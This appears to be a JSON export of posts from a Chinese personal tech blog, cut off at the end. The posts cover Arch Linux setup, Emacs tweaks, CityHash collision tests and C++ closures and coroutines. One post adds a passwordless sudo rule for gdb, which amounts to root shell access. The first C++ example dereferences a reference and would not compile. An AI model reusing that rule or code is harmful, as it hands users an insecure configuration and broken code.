[{
  "title": "使用o-blog搭建个人博客",
  "timestamp": "2013-04-09 12:30:00",
  "tags": [
    "o@blog"
  ],
  "body": "<p>\n新的博客使用<a href=\"http://renard.github.com/o-blog\">o-blog</a>搭建，使用的是自已的分枝<a href=\"https://github.com/tangxinfa/o-blog\">tangxinfa-o-blog</a>，我的分枝主要是对原系统做了一定的简化以便适用于创建个人博客，另修复了一些bug（主要是中文相关），可使用以下配置安装我的分枝：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(setq el-get-sources '((<span style=\"color: #cc99cc;\">:name</span> tangxinfa-o-blog\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">:type</span> git<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">:url</span> <span style=\"color: #66cccc;\">\"https://github.com/tangxinfa/o-blog.git\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">:load</span> <span style=\"color: #66cccc;\">\"o-blog.el\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">:features</span> o-blog)))\n</pre>\n</div>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">M-x el-get-install tangxinfa-o-blog\n</pre>\n</div>\n\n<p>\n具体使用可参考本博客的原始org文件：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https://github.com/tangxinfa/tangxinfa.github.com.git\n</pre>\n</div>\n"
},
{
  "title": "Archlinux下安装fcitx输入法",
  "timestamp": "2012-12-15 21:56:00",
  "tags": [
    "archlinux",
    "fcitx"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo yaourt -S fcitx-im\nln -s /etc/xdg/autostart/fcitx-autostart.desktop  ~/.config/autostart/\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">配置</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n在配置文件~/.xprofile中添加以下内容：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">GTK_IM_MODULE</span>=fcitx\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">QT_IM_MODULE</span>=fcitx\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">XMODIFIERS</span>=<span style=\"color: #66cccc;\">\"@im=fcitx\"</span>\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">LC_CTYPE</span>=<span style=\"color: #66cccc;\">\"zh_CN.UTF-8\"</span>\n</pre>\n</div>\n\n<p>\n因为用的是gnome3桌面，需要禁用ibus：\n</p>\n<pre class=\"example\">\ngsettings set org.gnome.settings-daemon.plugins.keyboard active false\n</pre>\n<p>\n还需要在键盘快捷键设置界面中将输入源切换的快捷键清除。\n</p>\n\n<p>\n打开 fcitx-configtool 在 Input Method 中添加 Keyboard - English(US) 和 WubiPinyin，\n现在可以 Ctrl + Space 切换输入法，进行中英文输入了。\n</p>\n\n<p>\n可以取消 fcitx 绑定的全局快捷键，如 emacs 要用 Ctrl+Alt+P，\nfcitx-configtool GUI 工具不能将全局快捷键置空，\n可以直接修改配置文件 ~/.config/fcitx/config 删除快捷键。\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">Switch Embeded Preedit</span>\n<span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">SwitchPreedit=CTRL_ALT_P</span>\n</pre>\n</div>\n<p>\n改成\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">Switch Embeded Preedit</span>\n<span style=\"color: #ffcc66;\">SwitchPreedit</span>=\n</pre>\n</div>\n<p>\n这是因为 fcitx 的配置如果为默认值，则直接注释掉，重启 fcitx 生效配置。\n</p>\n</div>\n</div>\n"
},
{
  "title": "Archlinux下安装cups打印系统",
  "timestamp": "2013-03-27 21:56:00",
  "tags": [
    "archlinux"
  ],
  "body": "<dl class=\"org-dl\">\n<dt> 安装 </dt><dd></dd>\n</dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S cups-pdf\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 启动 </dt><dd></dd>\n</dl>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl start cups\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 配置 </dt><dd>    参考：<a href=\"https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer\">https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer</a>\n\n<p>\n登录的用户名要为root，否则后面还是无法添加打印机，web界面没有退出登录的选项，可以试试重启cups服务浏览器清除缓存的数据。</p>\n</dd>\n</dl>\n"
},
{
  "title": "网页中的自动完成的下拉列表框",
  "timestamp": "2013-03-10 21:23:00",
  "tags": [
    "web",
    "jquery",
    "chosen"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">jqueryui的<a href=\"http://jqueryui.com/autocomplete/#combobox\">组件</a></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n示例效果看起来挻好，不过发现几个问题：\n</p>\n\n<ul class=\"org-ul\">\n<li>和<a href=\"http://twitter.github.com/bootstrap/\">bootstrap</a>有冲突，导致右边的下拉箭头部分都看不见。\n</li>\n<li>操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。\n</li>\n<li>没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。\n</li>\n</ul>\n\n<p>\n这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https://github.com/harvesthq/chosen\">chosen</a></h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n非常完美，配置很简单，而且界面很漂亮，在github上评分很高。</p>\n</div>\n</div>\n"
},
{
  "title": "CityHash算法冲突率测试",
  "timestamp": "2012-11-24 18:21:00",
  "tags": [
    "hash"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"http://code.google.com/p/cityhash/\">CityHash</a>介绍</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<a href=\"http://www.google.com\">Google</a> 2010年开始开发并开源的字符串哈希算法，主要包含CityHash32()、CityHash64()和CityHash128()，分别对应32位、64位、128位哈希算法。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">测试样本数据</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">cityhash64测试结果</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n没有冲突\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">cityhash32测试结果</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n共32246次冲突，冲突率约为千分之二。\n同一哈希值上55次冲突二次，32136次冲突一次。</p>\n</div>\n</div>\n"
},
{
  "title": "C++的函数、闭包与协程",
  "timestamp": "2013-03-15 10:04:00",
  "tags": [
    "cpp"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">实现序号生成器</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n</div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">函数（Function）</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;cassert&gt;</span>\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">id_generator</span>(<span style=\"color: #6699cc;\">int</span>&amp; <span style=\"color: #ffcc66;\">base</span>, <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">step</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">result</span> = *base;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   *base += step;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> result;\n}\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">odd_base</span> = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">even_base</span> = 0;<span style=\"color: #f99157; background-color: #515151;\">    </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(odd_base, 2) == 1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(odd_base, 2) == 3);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(odd_base, 2) == 5);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(even_base, 2) == 0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(even_base, 2) == 2);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator(even_base, 2) == 4);<span style=\"color: #f99157; background-color: #515151;\">        </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 编译 </dt><dd><pre class=\"example\">\ng++ -g add.cpp -o add\n</pre>\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">闭包（Closure）</h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;cassert&gt;</span>\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">base</span> = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">auto</span> <span style=\"color: #ffcc66;\">id_generator_odd</span> = [=]() <span style=\"color: #99cc99;\">mutable</span> { <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">result</span> = base; base += 2; <span style=\"color: #99cc99;\">return</span><span style=\"text-decoration: underline;\"> result; };</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   base = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">auto</span> <span style=\"color: #ffcc66;\">id_generator_even</span> = [=]() <span style=\"color: #99cc99;\">mutable</span> { <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">result</span> = base; base += 2; <span style=\"color: #99cc99;\">retur</span><span style=\"color: #99cc99; text-decoration: underline;\">n</span><span style=\"text-decoration: underline;\"> result; };</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd() == 1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd() == 3);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd() == 5);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even() == 0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even() == 2);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even() == 4);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(base == 0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 编译 </dt><dd><pre class=\"example\">\ng++ -g closure.cpp -o closure -std=c++0x\n</pre>\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-1-3\" class=\"outline-3\">\n<h3 id=\"sec-1-3\">协程（Coroutine）</h3>\n<div class=\"outline-text-3\" id=\"text-1-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;boost/bind.hpp&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;boost/coroutine/all.hpp&gt;</span>\n\n<span style=\"color: #99cc99;\">typedef</span> <span style=\"color: #6699cc;\">boost</span>::<span style=\"color: #6699cc;\">coroutines</span>::<span style=\"color: #6699cc;\">coroutine</span>&lt; <span style=\"color: #6699cc;\">int</span>(<span style=\"color: #6699cc;\">void</span>) &gt; <span style=\"color: #6699cc;\">IDGenerator</span>;\n\n<span style=\"color: #6699cc;\">void</span> <span style=\"color: #f99157;\">idGenerator</span>(<span style=\"color: #6699cc;\">IDGenerator</span>::<span style=\"color: #6699cc;\">caller_type</span>&amp; <span style=\"color: #ffcc66;\">ca</span>, <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">base</span>, <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">step</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">do</span>{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ca(base);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   base += step;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }<span style=\"color: #99cc99;\">while</span>(<span style=\"color: #6699cc;\">true</span>);\n}\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">IDGenerator</span> <span style=\"color: #f99157;\">id_generator_odd</span>(<span style=\"color: #6699cc;\">boost</span>::bind(idGenerator, _1, 1, 2));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">IDGenerator</span> <span style=\"color: #f99157;\">id_generator_even</span>(<span style=\"color: #6699cc;\">boost</span>::bind(idGenerator, _1, 0, 2));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd.get() == 1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd().get() == 3);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_odd().get() == 5);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even.get() == 0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even().get() == 2);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(id_generator_even().get() == 4);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 编译 </dt><dd><pre class=\"example\">\ng++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x\n</pre>\n</dd>\n</dl>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">特性比较</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">函数（Function）</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>无状态\n</li>\n<li>需要独立定义执行体\n</li>\n<li>调用过程中从头到尾执行体内所有代码\n</li>\n<li>在输入相同的情况下，能够保证输出也相同\n</li>\n<li>没有副作用，多线程安全\n</li>\n<li>要借助外部变量保存状态\n</li>\n<li>调用比较麻烦，需要传入保存状态的参数\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">闭包（Closure）</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<ul class=\"org-ul\">\n<li>有状态，内部直接保存\n</li>\n<li>直接内联定义执行体\n</li>\n<li>调用过程中从头到尾执行体内所有代码\n</li>\n<li>输入相同的情况下，输出可能不同\n</li>\n<li>有副作用，非多线程安全\n</li>\n<li>定义时可以多种方式安全地引用外部变量\n</li>\n<li>调用简单，不需要传入保存状态的参数\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">协程（Coroutine）</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<ul class=\"org-ul\">\n<li>有状态，内部直接保存\n</li>\n<li>需要独立定义执行体\n</li>\n<li>调用过程中直接从上次的运行状态继续运行\n</li>\n<li>输入相同的情况下，输出可能不同\n</li>\n<li>严禁多线程访问\n</li>\n<li>调用简单，不需要传入保存状态的参数    \n</li>\n</ul>\n</div>\n</div>\n</div>\n"
},
{
  "title": "在emacs模式行上显示图片的尺寸",
  "timestamp": "2012-08-03 08:55:00",
  "tags": [
    "emacs"
  ],
  "body": "<p>\n下面的lisp代码用于在emacs模式行上显示图片的尺寸：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(add-hook 'image-mode-hook (<span style=\"color: #99cc99;\">lambda</span> ()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">\"display image size on mode line.\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> (setq mode-name (format <span style=\"color: #66cccc;\">\"Image[%s](%s*%s)\"</span><span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> image-type<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> (car (image-size (image-get-di<span style=\"text-decoration: underline;\">splay-property) t))</span><span style=\"color: #f99157; background-color: #515151; text-decoration: underline;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> (cdr (image-size (image-get-di<span style=\"text-decoration: underline;\">splay-property) t))))))</span>\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 效果如下 </dt><dd></dd>\n</dl>\n<pre class=\"example\">\n[(Image[png](181*415))]\n</pre>\n"
},
{
  "title": "在emacs中如何以root权限使用gdb调试程序",
  "timestamp": "2013-03-30 14:21:00",
  "tags": [
    "emacs"
  ],
  "body": "<ul class=\"org-ul\">\n<li>由于M-x命令中使用sudo输入密码无效，需要配置为允许用户sudo gdb免密码\n</li>\n</ul>\n<pre class=\"example\">\nvisudo\n# Allow user to sudo gdb without password\n用户 ALL=NOPASSWD: /usr/bin/gdb\n</pre>\n\n<ul class=\"org-ul\">\n<li>使用root权限启动gdb\n</li>\n</ul>\n<pre class=\"example\">\nM-x gdb\nsudo gdb &lt;program&gt; &lt;pid&gt; --annotate=3\n</pre>\n"
},
{
  "title": "解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题",
  "timestamp": "2012-08-01 08:55:00",
  "tags": [
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">问题描述</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">解决方法</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n将嵌入的统计js脚本从&lt;/html&gt;标签后移到里面去。\n</p>\n<ul class=\"org-ul\">\n<li>修改前\n</li>\n</ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">...\n&lt;/<span style=\"color: #f99157;\">body</span>&gt;\n&lt;/<span style=\"color: #f99157;\">html</span>&gt;\n&lt;<span style=\"color: #f99157;\">script</span> <span style=\"color: #ffcc66;\">type</span>=<span style=\"color: #66cccc;\">\"text/javascript\"</span>&gt;document.write(unescape(<span style=\"color: #66cccc;\">\"%3Cscript%20...%3C/script%3E\"</span>));&lt;/<span style=\"color: #f99157;\">script</span>&gt;\n</pre>\n</div>\n<ul class=\"org-ul\">\n<li>修改后\n</li>\n</ul>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">...\n&lt;<span style=\"color: #f99157;\">script</span> <span style=\"color: #ffcc66;\">type</span>=<span style=\"color: #66cccc;\">\"text/javascript\"</span>&gt;document.write(unescape(<span style=\"color: #66cccc;\">\"%3Cscript%20...%3C/script%3E\"</span>));&lt;/<span style=\"color: #f99157;\">script</span>&gt;\n&lt;/<span style=\"color: #f99157;\">body</span>&gt;\n&lt;/<span style=\"color: #f99157;\">html</span>&gt;\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">心得</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。</p>\n</div>\n</div>\n"
},
{
  "title": "解决Archlinux下ati显卡3D硬件加速失效的问题",
  "timestamp": "2012-09-05 23:52:00",
  "tags": [
    "archlinux"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">问题描述</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>症状\n\n<p>\n进入gnome3桌面环境后很卡，不动还好，一动gnome-shell进程cpu占用就直奔100%。\n</p>\n</li>\n\n<li>dmesg异常日志\n<pre class=\"example\">\nradeon_cp: Failed to load firmware \"radeon/R520_cp.bin\"\nradeon 0000:01:00.0: failed initializing CP (-2).\nradeon 0000:01:00.0: Disabling GPU acceleration\n</pre>\n</li>\n</ul>\n</div>\n</div>\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">解决办法</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo ln -s /usr/lib/firmware /lib/\nsudo reboot\n</pre>\n</div>\n</div>\n</div>\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">经验总结</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n出现问题时网上不一定能找到你要的答案，像这个问题，网上的论坛里有无数个建议，一个一个试下去其实很浪费时间，\n试几次之后还没能解决就应该尝试主动分析解决，像这里稍微留意到括号里的-2，就能发现其实它是个错误码，\nperror一下就知道意思是“找不到文件或目录”，联想到最近几次升级archlinux在把/lib里的东西往/usr/lib下移，\n其中就包括firemware，这样手工在旧的firmware位置建一个软链接就解决了这个问题。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 